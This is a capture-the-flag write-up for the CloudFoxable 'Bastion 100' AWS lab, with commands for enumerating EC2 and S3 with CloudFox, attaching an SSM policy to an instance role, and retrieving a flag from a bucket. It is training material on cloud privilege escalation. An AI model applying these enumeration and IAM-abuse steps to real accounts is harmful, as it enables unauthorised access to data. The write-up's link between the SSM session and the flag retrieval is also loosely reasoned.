# CloudFoxable - Bastion 100 Write-Up

## Overview

This write-up documents the step-by-step process to solve the **CloudFoxable - Bastion 100** challenge and retrieve the flag. The challenge involves setting up a **bastion host** and leveraging AWS Systems Manager (SSM) and IAM role permissions to explore and extract the required flag.

---

## Challenge Setup

### 1. **Enable the Bastion Challenge**

To begin, I enabled the **bastion** challenge by modifying the Terraform configuration and applying it:

```bash
# Edit the Terraform variables file
tfvars_file="cloudfoxable/aws/terraform.tfvars"
sed -i 's/bastion_enabled = false/bastion_enabled = true/' $tfvars_file

# Apply the changes
terraform apply
```

Upon successful execution, Terraform will output important information, including **starting user credentials** and the **bastion EC2 instance details**.

---

## Accessing the Bastion Host

### 2. **Set Up AWS Credentials**

I configured AWS credentials to authenticate as the `ctf-starting-user`.

To verify that authentication is working:

```bash
aws sts get-caller-identity --profile cloudfoxable
```

---

## Enumerating EC2 Instances

### 3. **Find the Bastion Instance**

I used **CloudFox** to list EC2 instances and identify the **bastion** host:

```bash
cloudfox aws -p cloudfoxable instances -v2
```

This revealed an instance named `bastion` with the ID `i-02b1b4400ba4e0df8` and role `arn:aws:iam::390844766599:role/reyna` .

---

## Gaining Access via AWS SSM

### 4. **Attempt to Start an SSM Session**

To connect to the instance, I attempted an **AWS Systems Manager (SSM) Session**:

```bash
aws ssm start-session --target i-02b1b4400ba4e0df8 --profile cloudfoxable
```

However, this initially failed with:

```
An error occurred (TargetNotConnected) when calling the StartSession operation: i-02b1b4400ba4e0df8 is not connected.
```

### 5. **Attach the Required IAM Policy**

The error suggested that the instance lacks the required **SSM permissions**. I checked the IAM role attached to the instance using:

```bash
cloudfox aws -p cloudfoxable permissions --principal arn:aws:iam::390844766599:role/reyna
```

I then attached the missing **AmazonSSMManagedInstanceCore** policy to the `reyna` role:

```bash
aws iam attach-role-policy --role-name reyna --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
```

### 6. **Verify SSM Agent Status**

After attaching the policy, I checked the SSM status of the instance:

```bash
aws ssm describe-instance-information --filters Key=InstanceIds,Values=i-02b1b4400ba4e0df8 --profile cloudfoxable
```

This confirmed that the instance is now **online** and ready for an SSM session.

### 7. **Connect to the Bastion Host**

I then successfully established an **SSM Session**:

```bash
aws ssm start-session --target i-02b1b4400ba4e0df8

```

---

## Identifying the Flag

### 8. **Enumerate S3 Buckets**

I used **CloudFox** to list S3 buckets:

```bash
cloudfox aws -p cloudfoxable s3
```

The output reveals a bucket named **cloudfoxable-bastion-8oaiq**.

### 9. **List Files in the Bucket**

I listed the contents of the identified S3 bucket:

```bash
aws s3 ls s3://cloudfoxable-bastion-8oaiq
```

The output contained a file named `flag.txt`.

### 10. **Download and Read the Flag**

I retrieved the flag file:

```bash
aws s3 cp s3://cloudfoxable-bastion-8oaiq/flag.txt .
cat flag.txt
```

The flag is revealed:

```
{FLAG:bastion::ifYouHaveAccessToAnEC2YouHaveAccessToItsIamPermissions}
```

---

## Conclusion

This challenge demonstrated the process of:

- Deploying an AWS-based bastion host using Terraform.
- Setting up AWS credentials and enumerating cloud resources with **CloudFox**.
- Debugging SSM connection issues and fixing missing IAM permissions.
- Using **CloudFox** and AWS CLI to discover **S3 buckets** and retrieve the challenge flag.

This exercise highlights how **EC2 IAM roles** can be leveraged for privilege escalation and why **least privilege principles** are crucial in cloud environments.

**Key Takeaway:** If you have access to an EC2 instance, you may also have access to its associated IAM permissions, which can lead to unintended privilege escalation.

---
